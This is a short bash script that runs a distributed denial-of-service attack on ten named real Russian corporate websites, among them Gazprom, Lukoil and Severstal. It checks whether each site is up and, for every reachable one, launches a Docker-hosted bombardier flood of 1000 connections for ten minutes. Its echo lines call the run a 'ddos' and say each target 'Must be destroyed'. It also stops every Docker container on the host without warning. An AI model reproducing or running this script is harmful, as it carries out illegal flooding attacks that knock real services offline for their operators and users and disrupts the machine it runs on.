#!/bin/bash

# Configuration of Bombardier
BOMBARDIER_TIMEOUT=600s
BOMBARDIER_CONNECTIONS=1000

declare -a sites=(
"https://www.gazprom.ru/"
"https://lukoil.ru"
"https://magnit.ru/"
"https://www.nornickel.com/"
"https://www.surgutneftegas.ru/"
"https://www.tatneft.ru/"
"https://www.evraz.com/ru/"
"https://nlmk.com/"
"https://www.sibur.ru/"
"https://www.severstal.com/"
)

echo "Stop all containers"
docker stop $(docker ps -aq)
echo "Docker containers stopped"

echo "Run ddos for all sites"
for site in "${sites[@]}"
do
    status_code=$(curl -m 2 -o /dev/null -s -w "%{http_code}\n" "$site")
    status_code=$( expr "$status_code" + 0)

    # If status code is zero site is already blocked

    site_status="${site} status code ${status_code}"
    echo "$site_status"
    if  (("$status_code" != 0 && "$status_code" <= 400)); then
    echo "Must be destroyed"
    docker run -ti -d --rm alpine/bombardier -c "$BOMBARDIER_CONNECTIONS" -d "$BOMBARDIER_TIMEOUT" -l "$site"
    fi

done
